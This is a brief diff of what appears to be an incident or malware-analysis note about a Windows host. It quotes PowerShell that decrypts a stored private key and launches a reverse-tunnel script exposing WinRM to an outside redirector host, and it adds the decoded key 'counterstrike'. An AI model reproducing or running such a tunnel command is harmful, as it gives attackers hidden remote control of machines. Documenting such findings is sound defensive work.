@@ -38,6 +38,9 @@ $k=@(99,111,117,110,116,101,114,115,116,114,105,107,101)
 $p=_d (Get-Content -LiteralPath (Join-Path $PSScriptRoot 'pk.dat') -Raw) $k
 & (Join-Path $PSScriptRoot 'Inner-ReverseTunnel.ps1') -KeyPath $p -RedirectorHost '203.0.113.150' -RedirectorUser 'accesscheck' -RemotePort 55985 -LocalWinRMPort 5985 -SessionMinutes 20
 ```
+
+$k=counterstrike
+
 # C:\Windows\System32\Network_Share_Scripts\
 ```
 PS C:\Users\Administrator> gci C:\Windows\System32\Network_Share_Scripts\
